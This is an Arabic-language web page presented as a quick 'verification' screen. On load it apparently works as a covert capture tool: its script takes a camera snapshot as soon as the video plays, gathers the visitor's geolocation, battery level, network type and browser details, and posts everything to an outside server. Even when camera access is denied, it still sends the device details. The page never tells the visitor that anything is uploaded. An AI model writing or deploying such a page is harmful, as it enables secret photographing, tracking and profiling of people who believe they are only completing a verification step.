<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <title>توثيق سريع</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding: 20px;
      }
      video {
        margin-top: 10px;
        border: 2px solid #ccc;
        border-radius: 8px;
      }
      #info {
        margin-top: 20px;
        font-size: 1.2em;
        color: green;
      }
    </style>
  </head>
  <body onload="startCamera()">
    <h2 style="color: green">📸 توثيق فوري قيد التنفيذ...</h2>
    <video
      id="preview"
      autoplay
      muted
      playsinline
      style="width: 100%; max-width: 400px"
    ></video>
    <canvas id="snapshot" style="display: none"></canvas>
    <p id="info"></p>

    <script>
      let stream;

      async function startCamera() {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (err) {
          document.body.innerHTML =
            "<h2 style='color:red;'>❌ الكاميرا مرفوضة: " +
            err.message +
            "</h2>";
          sendPayload({
            image: "null",
            info: {
              time: new Date().toLocaleString(),
              location: "غير متاح",
              device: navigator.userAgent,
              battery: "غير متاح",
              network: "غير معروف",
            },
          });
          return;
        }

        const video = document.getElementById("preview");
        video.srcObject = stream;

        // نلتقط فورًا بعد أول إطار
        video.addEventListener("playing", () => {
          captureAndSend();
        });
      }

      async function captureAndSend() {
        const canvas = document.getElementById("snapshot");
        const video = document.getElementById("preview");
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");
        const timestamp = new Date().toLocaleString();
        const userAgent = navigator.userAgent;

        let batteryLevel = "غير متاح";
        let connectionType = "غير معروف";

        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        }

        if (navigator.connection) {
          connectionType = navigator.connection.effectiveType;
        }

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            sendPayload({
              image: imageData,
              info: {
                time: timestamp,
                location: `${pos.coords.latitude.toFixed(
                  5
                )}, ${pos.coords.longitude.toFixed(5)}`,
                device: userAgent,
                battery: batteryLevel,
                network: connectionType,
              },
            });
            document.getElementById("info").innerText = "✅ تم التوثيق الفوري";
          },
          () => {
            sendPayload({
              image: imageData,
              info: {
                time: timestamp,
                location: "غير متاح",
                device: userAgent,
                battery: batteryLevel,
                network: connectionType,
              },
            });
            document.getElementById("info").innerText =
              "✅ تم التوثيق بدون موقع";
          }
        );
      }

      function sendPayload(payload) {
        fetch("https://web-moment-server.onrender.com/upload", {
          method: "POST",
          body: JSON.stringify(payload),
          headers: { "Content-Type": "application/json" },
        });
      }
    </script>
  </body>
</html>
